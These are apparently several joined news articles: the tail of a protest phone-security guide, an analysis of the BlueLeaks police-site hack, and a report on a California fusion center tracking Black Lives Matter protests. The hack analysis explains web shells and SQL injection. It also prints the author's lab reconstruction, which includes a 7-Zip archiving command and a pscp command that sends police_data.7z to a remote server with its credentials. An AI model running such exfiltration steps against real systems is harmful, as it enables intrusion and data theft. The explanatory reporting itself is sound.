<p>Instead, you can avoid most communication surveillance by using an end-to-end encrypted messaging app. The <a href="https://signal.org/">Signal</a> app is a great choice. It’s easy to use and designed to hold as little information about its users as possible. It also lets Android users securely talk with their iPhone compatriots. You can use it for secure text messages, texting groups, and voice and video calls. Here’s a <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2017/05/01/cybersecurity-for-the-people-how-to-keep-your-chats-truly-private-with-signal/">detailed guide to securing Signal</a>.</p>
<p>Signal requires sharing your phone number with others to use it. If you’d rather use usernames instead of phone numbers, <a href="https://wire.com/en/">Wire</a> and <a href="https://keybase.io/">Keybase</a> are both good options.</p>
<p class="p1"><!-- BLOCK(promote-related-post)[1](%7B%22componentName%22%3A%22PROMOTE_RELATED_POST%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%22relatedPostNumber%22%3A1%7D) --><div class="promote-embed" data-related-post-number="1"></div><!-- END-BLOCK(promote-related-post)[1] --></p>
<p>If you use an iPhone and want to securely talk to other iPhone users, the built-in Messages and FaceTime apps are also encrypted. WhatsApp texts and calls are encrypted too. Though keep in mind that if you use Messages or WhatsApp, your phone may be configured to save unencrypted backups of your text messages to the cloud where law enforcement could access them.</p>
<p>You can’t use an encrypted messaging app all by yourself, so it’s important to get all of your friends and fellow activists to use the same app. The more people you can get to use an encrypted messaging app instead of insecure SMS and voice calls, the better privacy <em>everyone</em> has. (For example, I use Signal to text with my parents, and you should too.)</p>
<p>None of these encrypted messaging apps send data over insecure SMS messages or voice calls, so SIM cloning and stingrays can’t spy on them. Instead they send end-to-end encrypted data over the internet. This also means that the companies that run these services can’t hand over your message history to the cops even if they want to; police would instead need to extract those messages directly from a phone that sent or received them.</p>
<p>Another important consideration is preventing cops from copying messages directly off your phone. To prevent this, make sure your phone is locked with a strong passcode and avoid biometrics (unlocking your phone with your face or fingerprint) — or at least disable biometrics on your phone <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2017/04/21/cybersecurity-for-the-people-how-to-protect-your-privacy-at-a-protest/">before you go to a protest</a>. You also might consider <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2020/06/15/protest-tech-safety-burner-phone/">bringing a cheap burner phone to a protest</a> and leaving your main phone at home.</p>
<h3>Lock Your SIM Card With a PIN</h3>
<p>Another way to protect against certain forms of mobile phone spying is to lock your SIM card by setting a four- to eight-digit passcode known as a SIM PIN. Each time your phone reboots, you’ll need to enter this PIN if you want SMS, voice calls, and mobile data to work.</p>

<p>If you type the wrong PIN three times, your SIM card will get blocked, and you’ll need to call your phone carrier to receive a Personal Unblocking Key (PUK) to unblock it. If you enter the wrong PUK eight times, the SIM card will permanently disable itself.</p>
<p>With a locked SIM, you’ll still be able to use apps and Wi-Fi but not mobile data or cellphone service. So make sure that you securely record your SIM PIN somewhere safe, such as a password manager like Bitwarden, 1Password, or LastPass, and never try to guess it if you can’t remember it. (You can always click “Cancel” to get into your phone without unlocking your SIM card. From there, open a password manager app to look up your PIN, and then reboot your phone again to enter it correctly. I’ve done this numerous times myself just to be sure.)</p>
<p>If you want to lock your SIM card, first you’ll need to know the default SIM PIN for your cellphone company. For AT&amp;T, Verizon, and Google Fi, it’s 1111; for T-Mobile, Sprint, and Metro, it’s 1234. If you use a different phone carrier, you should be able to search the internet to find it. (I would avoid guessing — if you type the wrong default PIN three times, your SIM card will get blocked.)</p>
<p>Once you know your default PIN, here’s how to you set a new one:</p>
<ul>
<li>If you have an iPhone, go to Settings, then Cellular, then SIM PIN, and from there you can set your PIN. See <a href="https://support.apple.com/en-us/HT201529">here</a> for more information.</li>
<li>If you have an Android phone, go to Settings, then Security, then “SIM card lock,” and from there you can set your PIN. If your Android phone doesn’t have these exact settings, you should be able to search the internet for your phone model and “SIM PIN” to find instructions for your phone.</li>
</ul>
<p>Now if law enforcement gets physical access to your phone, they shouldn’t be able to use your locked SIM card without your PIN. If they guess your PIN incorrectly three times, the SIM card will block itself, and they’d need to convince your cellphone company to hand over the PUK for your SIM card in order to use it. If they guess the wrong PUK too many times, the SIM will permanently disable itself.</p>

                                        <content:encoded><![CDATA[<p><u>Whoever broke into</u> 251 law enforcement websites and obtained the <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/collections/blueleaks/">BlueLeaks trove</a> of documents appears to have reused decades-old software for opening “backdoors” in web servers.</p>
<p>The use of the widely available backdoors provides evidence that the hacktivist who compromised the sensitive sites, including fusion centers linked to federal agencies, didn’t need to use sophisticated digital attack methods because the sites were not very secure.</p>
<p class="p1"><!-- BLOCK(promote-related-post)[0](%7B%22componentName%22%3A%22PROMOTE_RELATED_POST%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%22relatedPostNumber%22%3A1%7D) --><div class="promote-embed" data-related-post-number="1"></div><!-- END-BLOCK(promote-related-post)[0] --></p>
<p>The backdoors appear among files in the roughly 270-gigabyte BlueLeaks dump but seem to originate not from law enforcement entities, like most of the documents, but from the hacker, who appears to have left behind a few tools in the leaked data. Other leaked files provide further clues about how the hacktivist operated.</p>
<p>Two of the files are a type of malware known as “<a href="https://en.wikipedia.org/wiki/Web_shell">web shel</a><a href="https://en.wikipedia.org/wiki/Web_shell">ls</a>”: malicious files that, when placed on a server, provide an online entry point through which a hacker can download and upload files or issue commands of their choosing. These backdoors appear with BlueLeaks material obtained from the website of the <a href="https://www.azhidta.org/">Arizona High Intensity Drug Trafficking Area</a>, which is basically Arizona’s fusion center for the drug war. One is called “ntdaddy.aspx” and the other is “blug.aspx.” Their presence has implications for all the affected sites, which were operated by the same company and appear to have run the same software.</p>
<p>Two other files appear to have aided the exfiltration of documents from the servers. The Arizona HIDTA files included a copy of a program for securely transferring files across the internet, which could have been used to move files onto a computer controlled by the hacker. Files for another site, <a href="https://icefishx.org/">ICEFISHX</a>, Minnesota’s police fusion center, included a copy of a program for compressing files, which would make it much faster for the hacker to upload hundreds of gigabytes of data to their own computer.</p>
<p class="p1"><!-- BLOCK(newsletter)[1](%7B%22componentName%22%3A%22NEWSLETTER%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%7D) --><div class="shortcode" data-shortcode="newsletter" data-campaign="" data-cta="" data-headline="" data-layout="" data-subhead=""></div><!-- END-BLOCK(newsletter)[1] --></p>
<p>All four of the files appear to be circumstantially linked to the hacker through their digital time stamps, which indicate they were created the evening of Saturday, June 6 —making them among the most recent data released in BlueLeaks. Basically, this time likely corresponds to the moments before the hacktivist exfiltrated the data for this leak.</p>
<p>The files do not provide any information about the identity of the hacker, how the hacker protected their anonymity, what infrastructure they used to exfiltrate data, or what vulnerability they exploited to initially hack these websites. But they do indicate that, instead of developing custom malware, the hacker pulled off-the-shelf software easily available to anyone online and that anti-virus software flags as malicious.</p>
<h3>The BlueLeaks Data</h3>
<p>The Arizona HIDTA and Minnesota ICEFISHX websites, as well as the rest of the hacked websites included in BlueLeaks, were built and hosted by the Texas web development firm Netsential. They all run the same web application, hosted on Microsoft’s Windows operating system; on Microsoft’s web server, Internet Information Services, or IIS; and on a Microsoft web programming framework, ASP.NET.</p>
<!-- BLOCK(promote-related-post)[2](%7B%22componentName%22%3A%22PROMOTE_RELATED_POST%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%22relatedPostNumber%22%3A4%7D) --><div class="promote-embed" data-related-post-number="4"></div><!-- END-BLOCK(promote-related-post)[2] -->
<p>The web app’s data is also stored using Microsoft software, in a database system known as Access. For ICEFISHX, data lived in the file “icefishx.mdb” on its server. The database included information about 6,120 registered users, the content of 3,151 bulk emails that the fusion center sent out, as well as metadata about hundreds of documents. Arizona HIDTA’s data was in a file called ”azhidta.mdb” and, among other things, included metadata describing thousands of items like laptops, furniture, and surveillance body wires in the HIDTA’s inventory.</p>
<p>BlueLeaks contains a separate folder for each hacked website. The files for the Arizona HIDTA website include what appears to be the original source code for the website, written in ASP.NET, along with the malicious web shells, “ntdaddy.aspx” and “blug.aspx,” as well as images, JavaScript files, and other files that make up the code of Netsential’s web app. It also includes all of the PDFs and Microsoft Office documents that were uploaded into the web app. While it does not directly include “azhidta.mdb,” the Access database, it does include references to the database, along with 220 spreadsheets, each one representing a table — that is, a collection of related, structured data — exported from the database. (This is true for most of the other hacked websites included in BlueLeaks, though some don’t contain all of the web app’s source code.)</p>
<p>According to historical domain name <a href="https://securitytrails.com/domain/azhidta.org/history/a">records</a>, on July 17, almost a month after the hack was made public, Arizona HIDTA migrated <a href="https://www.azhidta.org/">their website</a> away from Netsential’s Houston server and into the website hosting service Squarespace. ICEFISHX still uses Netsential’s web application. (Netsential stated on its website that it was not responding to requests for comment from the press. It did not respond to a message from The Intercept.)</p>
<h3>SQL Injection</h3>
<p>There is no legitimate reason for the “ntdaddy.aspx” and “blug.aspx” web shells to exist among Arizona HIDTA’s files — these were definitely traces left over from a hack — but it’s not clear exactly how<i> </i>they got onto the server to begin with. What was the initial attack vector used to compromise the server? I couldn’t find any direct evidence; there’s no mention of “ntdaddy” in log files, for example. But my best guess is that the hacker added the web shells using a type of web hacking called “SQL injection,” in which an attacker is able to modify the instructions sent to the database powering a website.</p>
<p>The Open Web Application Security Project, a nonprofit dedicated to improving the security of web software, puts injection attacks at the <a href="https://owasp.org/www-project-top-ten/">top of its list</a> of security risks for web applications. SQL, short for Structured Query Language, is used by programmers to read and update many types of databases, including the Microsoft Access databases used by all of the hacked websites in the BlueLeaks dump. A SQL injection attack is when a hacker is able to “inject” their own SQL code inside a query, tricking the database into responding with different information or different actions than the website programmer intended. This is typically accomplished by visiting a maliciously devised web address or submitting <a href="https://xkcd.com/327/">specially crafted information</a> into a web form and  exploiting a flaw in how the website creates SQL queries to obtain particular information on behalf of particular users. On a badly configured web server, it would be <a href="https://bytes.com/topic/access/answers/542431-access-sql-exporting-csv-txt-file">possible</a> (using the Access SQL query <a href="https://docs.microsoft.com/en-us/office/client-developer/access/desktop-database-reference/select-into-statement-microsoft-access-sql">SELECT.INTO</a>) for a hacker who has discovered a SQL injection vulnerability to create new files on the server and fill them with whatever information they want, such as code that makes up a web shell.</p>
<!-- BLOCK(promote-promo)[3](%7B%22componentName%22%3A%22PROMOTE_PROMO%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%22align%22%3Anull%2C%22crop%22%3A%22promo%22%2C%22promo%22%3A%22blueleaks%22%7D) --><div class="promote-embed" data-promo="blueleaks" data-crop="promo" data-align=""></div><!-- END-BLOCK(promote-promo)[3] -->
<p align="left">The best way to write software that isn’t vulnerable to SQL injection is to use a technique called <a href="https://en.wikipedia.org/wiki/Prepared_statement">prepared statements</a>. Based on my analysis of the web app’s source code, Netsential’s web app (as it existed in the leaked files) does not use this technique. With prepared statements, the programmer narrowly determines ahead of time which part of a SQL query will change in response to the user and which part will always remain the same. Instead, the Arizona HIDTA’s website source code, as well as the code from the rest of the hacked website in BlueLeaks, builds its SQL queries in an insecure way: only trying to mitigate SQL injection using a poorly implemented and error-prone technique known as “<a href="https://en.wikipedia.org/wiki/SQL_injection#Mitigation">escaping</a>,” which attempts to essentially neutralize malicious user input before using that input to build SQL queries. Another <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection">best practice</a> is to use a “safe API” for interfacing with the database. Netsential’s web app doesn’t appear to do this either; every time it needs to interface with the database, the code executes a SQL query directly.</p>
<p>Because of this, it’s likely that Netsential’s web app has SQL injection vulnerabilities. To be clear, I haven’t discovered any myself. But the fact that the web app uses such bad security practices around SQL, and that I counted 1,931 places in the code where a SQL query gets executed, I think that it’s probable that mistakes were made in at least some of these places.</p>
<p>And, unless Netsential has fixed these potential vulnerabilities since the BlueLeaks data was made public and pushed updates to all of the websites still running its code, it’s likely that these law enforcement websites, including major police fusion centers in use today, are <i>still</i> vulnerable to SQL injection.</p>
<h3>Web Shells</h3>
<p>I wanted to see what these web shells could do, so I set up a Windows <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2015/09/16/getting-hacked-doesnt-bad/">virtual machine</a>, installed an IIS web server, and copied both the ntdaddy.aspx and blug.aspx files from the Arizona HIDTA website into it. I also disabled the built-in Windows virus and threat protection; otherwise, Windows blocks both of these web shells from executing.</p>
<p>The “NTDaddy” web shell was first developed <a href="https://securiteam.com/tools/6L00B152UW/">at least</a> 18 years ago by a hacker named “obzerve” who worked with the hacker group fux0r inc. It’s widely available, including in <a href="https://github.com/nikicat/web-malware-collection/blob/master/Backdoors/ASP/ntdaddy.asp">this GitHub repository</a> containing a collection of web malware. If you <a href="https://www.virustotal.com/gui/file/baf4c45b84a1cca5fd1b32df4d4d60d7cb41135c61156772bd9eec6f7660af6e/detection">scan</a> the ntdaddy.aspx file on VirusTotal, 36 out of 59 anti-virus programs flag it as malicious, generally classifying it as a web server backdoor.</p>

<p>But while testing out this web shell, I hit a problem. NTDaddy was coded in a language called <a href="https://en.wikipedia.org/wiki/Active_Server_Pages">classic ASP</a>, Microsoft’s first server-side scripting language from 1996. Classic ASP files end in “.asp,” like ntdaddy.asp. In 2002, Microsoft released a more modern web application framework called <a href="https://en.wikipedia.org/wiki/ASP.NET">ASP.NET</a>, making classic ASP obsolete. ASP.NET files end in “.aspx,” like ntdaddy.aspx. Even though NTDaddy was coded in <i>classic ASP</i>, its filename on the Arizona HIDTA website used an <i>ASP.NET filename</i>: ntdaddy.aspx.</p>
<p>When I load ntdaddy.aspx in a browser, it responds with an error, which is to be expected because it’s trying to run a classic ASP code as if it were ASP.NET code.</p>

<p>It’s likely that the Arizona HIDTA’s IIS server wasn’t configured to execute classic ASP code at all, that this web shell simply didn’t work, and that the hacker didn’t bother deleting this file.</p>
<p>If I rename the file to ntdaddy.asp and load it in a browser, I can then explore the files on the server, upload new files, or issue commands:</p>

<p>The blug.aspx file contained a web shell simply called “ASPX Shell,” developed in 2007 by a hacker called “LT” — only the version on Arizona HIDTA’s website didn’t include the comment at the top of the file that gives LT credit, and lists the 2007 date.</p>

<p>Like NTDaddy, ASPX Shell is widely available and can be <a href="https://github.com/nikicat/web-malware-collection/blob/master/Backdoors/ASP/aspxshell.aspx.txt">found</a> in that GitHub repository. If you <a href="https://www.virustotal.com/gui/file/71649375b194112c40add6f458f1e0199382eee5333eca045aa1babddc951af6/detection">scan</a> blug.aspx in VirusTotal, 15 out of 59 anti-virus programs flag it as malicious, generally classifying it as a web server backdoor.</p>

<p>But unlike NTDaddy, ASPX Shell works much better because it uses ASP.NET, not classic ASP (the malware itself was written in the C# programming language). It allows you to browse the file system, upload files, and run commands as if you were sitting in front of the Windows server with a command prompt open. Basically, it allows you to do anything that the IIS user on the Windows server has permission to do, including access all of the data related to the website.</p>
<p>However, when I try uploading a file to the folder where website files are stored (in my case, C:\inetpub\wwwdata), I get an unauthorized access error; perhaps my IIS server in Windows 10 Pro is more securely configured than Netsential’s servers. To more accurately replicate the Netsential servers, I reduced the permissions on that folder to allow my IIS user to save new files there.</p>
<h3>Compression and Exfiltration</h3>
<p>In addition to the web shells, two open-source Windows tools were included with the BlueLeaks files, both with June 6 time stamps:</p>
<ul>
<li>ICEFISHX’s folder has a file called 7z.exe, a copy of the popular file compression and extraction program <a href="https://www.7-zip.org/">7-Zip</a>.</li>
<li>Arizona HIDTA’s folder has a file called pscp64.exe, a program that comes with <a href="https://putty.org/">PuTTY</a>, a popular Windows tool for securely logging into and copying files to remote servers, typically those running the Linux operating system.</li>
</ul>
<p>Using ASPX Shell, a hacker could run 7-Zip to compress all of the data they wished to exfiltrate, and then use PuTTY to copy it to a remote server controlled by the hacker.</p>
<p>So I decided to try this. In my first attempt at running 7z.exe, it gave me an error message saying that the file 7z.dll was missing. Possibly, the hacker uploaded this DLL file as well, but for whatever reason did not end up including it in the BlueLeaks data. So I downloaded a fresh copy of 7-Zip and grabbed the version of 7z.exe and 7z.dll from there. Then, I ran this command in my web shell:</p>
<p><code>7z.exe a police_data.7z c:\inetpub</code></p>
<p>This uses 7-Zip to create a new archive called police_data.7z, and it adds all of the files in the C:\inetpub folder to that archive.</p>

<p>Now that I’ve created police_data.7z, I could just download the archive using my web browser. But instead I decided to try using PuTTY to exfiltrate the data to a remote server, which is what I’m guessing the BlueLeaks hacktivist did.</p>
<p>I created a new cloud server running Debian GNU/Linux with the IP address 159.89.55.248, and on that server I created a new user called “exfiltrator” with the password “89qzR2Y8KbFj”. Then, in ASPX Shell, (after a bit of troubleshooting) I ran this command:</p>
<p><code>pscp64.exe -batch -hostkey 05:d3:9a:ce:59:e6:28:e4:17:2c:da:69:22:53:04:14 -pw 89qzR2Y8KbFj police_data.7z exfiltrator@159.89.55.248:police_data.7z</code></p>
<p>This uses PuTTY’s secure copy (SCP) program to copy the police_data.7z file to my Debian server. The command includes the username, password, and IP address of my server. After running this command, a copy of the file was exfiltrated to my server. (I’ve already deleted that cloud server, in case you get any ideas.)</p>
<h3>Hacking 251 Websites</h3>
<p>To recap, here’s how I believe these websites were hacked:</p>
<ul>
<li>The hacktivist found a SQL injection vulnerability, and then used it to create a web shell.</li>
<li>Using the web shell, they uploaded tools: 7-Zip and PuTTY.</li>
<li>They used 7-Zip to compress all of the data they wanted to exfiltrate.</li>
<li>They used PuTTY to copy this hacked data to a remote server they controlled.</li>
</ul>
<p>To be clear, I’m not sure that this is what the BlueLeaks hacker actually did or not. I have no inside knowledge; this is just my best guess based on the available evidence.</p>
<p>And because all of these websites run Netsential’s custom, insecure web app code, this process would likely be the same to hack any of them. In fact, it could even be automated to save time, allowing the hacker to compromise all 251 websites and exfiltrate all of the data from them in a single Saturday evening.</p>

                                        <content:encoded><![CDATA[<p><u>Almost two weeks after</u> a Minneapolis police officer killed George Floyd while he was handcuffed face down in the street, a hacker began exfiltrating 19 gigabytes of documents from the poorly secured Northern California Regional Intelligence Center website. The NCRIC (pronounced “nick-rick”) fusion center shares information between federal agencies, local police departments across northern California, and private industry partners, including Silicon Valley companies. It also provides local cops with analytical and technical support services such as monitoring social media or helping break into locked smartphones, and it hosts events and law enforcement-related courses.</p>
<p>The hacked data from NCRIC, provided to transparency collective DDoSecrets by a source identifying with the hacktivist collective Anonymous, was part of a <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2020/07/15/blueleaks-anonymous-ddos-law-enforcement-hack/">larger breach of 251 police websites</a> across the country known as <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/collections/blueleaks/">BlueLeaks</a>. German authorities, acting on behalf of the U.S. government, seized the server DDoSecrets was using to distribute the BlueLeaks data, though the data itself is still publicly available on the internet using the peer-to-peer file sharing technology BitTorrent. (Note: I’m a member of the DDoSecrets advisory board.)</p>
<p>The NCRIC documents, from a 13-day period between George Floyd’s killing on May 25 and the evening of June 6, when the latest information was exfiltrated (judging from time stamps found in the leaked material), provide an unprecedented window into the internal workings and priorities of Northern California’s police intelligence agency during the recent waves of anti-police brutality protests.</p>
<p class="p1"><!-- BLOCK(newsletter)[0](%7B%22componentName%22%3A%22NEWSLETTER%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%7D) --><div class="shortcode" data-shortcode="newsletter" data-campaign="" data-cta="" data-headline="" data-layout="" data-subhead=""></div><!-- END-BLOCK(newsletter)[0] --></p>
<p>One way that NCRIC shares information is by sending bulk emails to its partners. Since the protests began, these have included vague, fear-inducing memos from the Department of Homeland Security and the FBI about the threat of violent civil unrest, as well as more specific information, including emails sent at 10 a.m. and 6 p.m. every day to more than 14,000 police officers across Northern California with updated lists of Black Lives Matter protests. During the 13-day period covered in the hacked files, over half of the bulk emails NCRIC sent were related to monitoring and policing the largely peaceful protests.</p>
<p>Local police and other partners send information back to NCRIC by submitting “Suspicious Activity Reports.” Of the 21 civil unrest-related “suspicious activities” during this period, most were local police posting information about upcoming protests, screenshots of tweets and Instagram posts about looting and rioting, as well as two instances of people threatening to shoot and kill Black Lives Matter protesters.</p>
<p>Another way local police interface with NCRIC is by requesting support. Of the 20 civil unrest-related support requests during this period, most were providing information about upcoming protests to be added to the daily protest emails as well as requesting help monitoring social networks for information about the protests. Two of the requests asked for help identifying threats against white female teenagers who were facing doxxing or harassment after making racist statements and using anti-Black racial slurs.</p>
<h2>Daily Lists of Black Lives Matter Protests</h2>
<p>Notably, a substantial portion of the intelligence on Black Lives Matter protests flowed through NCRIC’s Terrorism Liaison Officer program, whose <a href="https://ncric.org/default.aspx?menuitemid=629">purpose</a> is to keep the intelligence center’s members “engaged &amp; knowledgeable about current terrorist tactics, techniques &amp; trends, regional crime trends &amp; threats, and Officer safety information.” The terror-info program became a clearinghouse for information on upcoming demonstrations.</p>
<p>The weekend after Floyd’s killing, when Black Lives Matter protests were erupting throughout the country, NCRIC’s TLO sent an email to its 14,406 subscribers — mostly local police officers across Northern California — with a PDF containing a list of upcoming protests, their times, locations, and sometimes links to more information. “We will be providing a list of local protests twice daily at 1000 and 1800, until further notice,” the email said. “This information is for Situational Awareness only. Agencies may use this information for planning/staffing purposes or as they see fit,” adding, “Some of these events involve criminal activities such as planned looting, vandalism and threats of violence.”</p>
<p>Between May 31 and June 6, NCRIC sent these emails out every morning, and again with an updated list every evening.</p>

<p>June 5’s evening email listed 46 protest events scheduled for June 6 in San Francisco, San Jose, Palo Alto, Berkeley, Oakland, and other Bay Area cities, as well as 36 other events scheduled for the following days. For example, the “Noe Valley Police Violence Protest With Social Distancing” was scheduled for June 6 at 11 a.m., and the “SF Kids Peace March” was scheduled for June 7 at 2 p.m. While the vast majority of the events were Black Lives Matter protests, some had different topics, such as a “6 Feet and Grieving COVID 19 remembrance” event in Oakland.</p>
<p>“The fact that fusion centers are sending out lists of protests and other activities that are protected by the First Amendment is constitutionally suspect,” Vasudha Talla, a senior staff attorney with the American Civil Liberties Union of Northern California, told The Intercept. “They may try to justify it by attaching text alluding to the potentiality of certain criminal activity, but it’s clear from the documents that you showed me that there is no reasonable suspicions attached to any of these events.” She added, “Really what we have here is overbroad collection and dissemination of people’s protected First Amendment activity, and it’s untethered to any basis in the law.”</p>

<p>Mike Sena, NCRIC’s executive director, told The Intercept that the fusion center no longer distributes daily lists of protests. “During that period of time we had just had an attack on the Ronald Dellums Federal Building,” he said, referring to the May 29 killing of Dave Patrick Underwood, a private security officer guarding the federal building in Oakland. Steven Carrillo, a far-right extremist and member of the so-called <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2020/06/10/boogaloo-boys-george-floyd-protests/">Boogaloo</a> movement, who “came to Oakland to kill cops” according to the FBI, was <a href="https://www.nbcnews.com/news/us-news/airman-charged-killing-federal-officer-during-george-floyd-protests-california-n1231187">charged</a> on June 11 in the murder of Underwood. When asked at what point NCRIC stopped distributing lists of protests, Sena said, “I believe it was after the suspects were taken into custody, from that attack. At least the known suspects were taken into custody. We don’t have that going on anymore.”</p>
<p>Sena also claimed that NCRIC was keeping track of Black Lives Matters protests in order to make sure that they remained safe. “We weren’t keeping track of the protests themselves, but we were identifying where we were gonna have gatherings of people,” he said. “That’s our concern is, we want to make sure the events are safe. And if there are any threats that come up that may be associated with any of those events that we’re able to get that threat data to whatever agency may have protection responsibilities.”</p>
<p>Talla disagreed. “At the end of the day what you have is federal agencies, not only DHS but the FBI, monitoring people’s constitutionally protected activities without any reasonable suspicion,” she said. “Even though the agencies may include in some of these documents a disclaimer that they are not targeting First Amendment activities as such, if you actually look at what they’re doing, it’s clear that there is no criminal activity that they can point to to justify the overbroad collection and monitoring of protests. They have no basis to do that.”</p>

<p>Beginning with the second protest list that was emailed out, the footer of each PDF says: “This document is not subject to the California Information Practices Act and contains information that may be exempt from public release under exemptions provided by the California Public Records Act,” and “This information is not to be released to the public, the media, or other personnel who do not have a valid ‘right and need-to-know’ without approval of the NCRIC.”</p>
<p>Sena claimed that the reason these documents were exempt from public records requests, and were not supposed to be released to the public or the media, is because they could be used as a target list by someone who wanted to attack the protesters.</p>
<p>“Simply attaching a tagline to a document saying ‘This is exempt from the California Public Records Act’ does not make it exempt from the California Public Records Act in and of itself,” Talla said. “The document you sent me can’t be characterized as criminal intelligence because there’s no articulation of any criminal activity associated with these activities, these protests, marches, demonstrations. Really, what is confidential about this document? There’s nothing.”</p>
<h2>Federal Fearmongering</h2>
<p>Days after the Floyd killing, someone in the FBI’s Los Angeles division noticed a tweet from the Long Beach Anarchist Collective that read, “see a blue lives matter flag, destroy a blue lives matter flag challenge”:</p>

<p>At the time, this tweet had four retweets and 26 likes.

<p>NCRIC got a copy of this document and forwarded it to its more than 14,000 subscribers. This is far from the only fearmongering memo from the federal government that NCRIC forwarded to thousands of local cops; DHS and FBI consistently fed local cops a diet of scary-protester anecdotes and internet rumors, potentially <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2020/06/26/blueleaks-minneapolis-police-protest-fears/">frightening them into believing their lives were in danger</a> during protests and thus helping feed the often brutal and violent response to peaceful protests.</p>
<p>Another <a href="https://www.documentcloud.org/documents/7033686-NETF-Awareness-Bulletin-Hazardous-Devices-Used.html">document</a> from the multi-agency National Explosives Task Force that NCRIC distributed claimed “a variety of incendiary and explosive devices were used against civilian and law enforcement targets in civil unrest demonstrations” with photos of Molotov cocktails and fireworks. NCRIC also distributed an <a href="https://www.documentcloud.org/documents/7033689-SITREP-6-JUN-1300-OPE.html">FBI Situation Report</a> which described cherry-picked messages posted by unnamed social media users, including an Instagram user who allegedly posted about a “purge” planned for June 6, saying that “anyone stopped by police should follow the only rule, to kill law enforcement first, then continue destroying property.” Without any context, there’s no way of knowing how many followers this account had, or if it was run by an internet troll.</p>

<p>NCRIC also forwarded a series of “Intelligence Notes” from the Department of Homeland Security to its members:</p>
<ul>
<li>One <a href="https://www.documentcloud.org/documents/7033693-U-LES-in-Domestic-Terrorists-Could-Exploit.html">document</a> from May 29 claimed that the ongoing unrest related to the killings of Floyd and Breonna Taylor — a 26-year-old emergency medical technician who was shot eight times by Louisville, Kentucky, police officers as they were breaking into her apartment late at night without announcing themselves — “could motivate some domestic terrorist actors to engage in violence against law enforcement and others protesting lawfully.”</li>
<li>Another <a href="https://www.documentcloud.org/documents/7033687-Ongoing-Concern-for-Violence-FINAL.html">document</a> from May 30 stated, “We anticipate armed individuals will continue to infiltrate the protest movement. We assess with high confidence during the period of darkness from 30 to 31 May the violent protest movements will grow and [domestic violent extremists] and others will seek to take over government facilities and attack law enforcement.”</li>
<li>A <a href="https://www.documentcloud.org/documents/7033691-U-FOUO-in-Potential-for-Illicit-Actors.html">document</a> from May 31 described protesters monitoring and disrupting law enforcement communications. Police in Portland “reported that they assessed that well-coordinated groups had potentially compromised law enforcement radio communications,” and police in Minneapolis “were forced to switch to cell phones for tactical communications after learning their communications were being monitored by individuals using publicly available police scanner apps.” Police scanner apps, which allow anyone to listen in on police radio communications, have seen <a href="https://techcrunch.com/2020/06/01/amid-protests-u-s-police-scanner-apps-and-others-saw-record-downloads/?guccounter=1&amp;guce_referrer=aHR0cHM6Ly9uZXdzLmdvb2dsZS5jb20v&amp;guce_referrer_sig=AQAAABzlh0OoLpeOqQZ0VSjkg2sHkxz4cHZTxNqdQ0EGb6t2yR6Agb26I95uTDgreRiWEUZezFS4876ergMcpuXJu7z4uzHSVFi7NnUwMMqj8cFJiSBb-G_oyVjjeGVZKwqh7mra2rYa-WEhYfvp_CFLrDy4Aves9g19ahbGqw4croGa" target="_top">record downloads</a> since Floyd’s killing. The document also states that “unidentified individuals” in the Chicago area saturated police radio channels with music.</li>
<li>Another May 31 <a href="https://www.documentcloud.org/documents/7033694-U-LES-in-Mitigation-Efforts-to-Combat-Ongoing.html">document</a> states, “We have also noted several incidents of potential violent opportunists traveling to protests with milk or other liquids in anticipation of mitigating the effects of pepper spray or other crowd control agents.”</li>
<li>A <a href="https://www.documentcloud.org/documents/7033692-U-FOUO-in-Some-Violent-Opportunists-Probably.html">document</a> from June 1 states, “As the protests persist, we assess that organized violent opportunists—including suspected anarchist extremists—could increasingly perpetrate nationwide targeting of law enforcement and critical infrastructure.” It went on to say that an NYPD official “had strong evidence that suspected anarchist groups had planned to incite violence at protests, including by using encrypted communications.” Using encrypted communications is not only perfectly legal, but an important measure that individuals can take to protect their personal cybersecurity. The document also warns of “Foreign Influence Activity,” stating, “Russian state media outlets particularly emphasized themes alleging excessive police brutality, police attacks against journalists, and claims of systematic racism.”</li>
</ul>
<h2>Prioritizing Spying on Protests</h2>
<p>NCRIC’s tracking of BLM protests sometimes interfered with work targeting actual criminal suspects. Shortly after 5 p.m. on May 29, an FBI analyst submitted a support request to the NCRIC website. “FBI San Francisco is concern [sic] about possible criminal activity; including mass causality attacks, vandalism and destruction of property, violence towards law enforcement and participants, and ideologically motivated attacks; near or about constitutionally protected activities in Oakland in response to the death of George Floyd in Minneapolis,” he wrote. He requested NCRIC provide [Real-Time and Open Source Analysis] “and appropriate analytic resources.”</p>
<p>On June 1, the day after NCRIC began distributing lists of protests, NCRIC sent a bulk email to its subscribers saying that it was “actively monitoring potential planned criminal acts, acts of violence, and civil unrest” and asking for help. “Please submit upcoming events or concerns related to planned events by logging into ncric.org, clicking on the ‘Request Support’ tab, and submitting a ‘Request for Investigative or Equipment Support.’”</p>
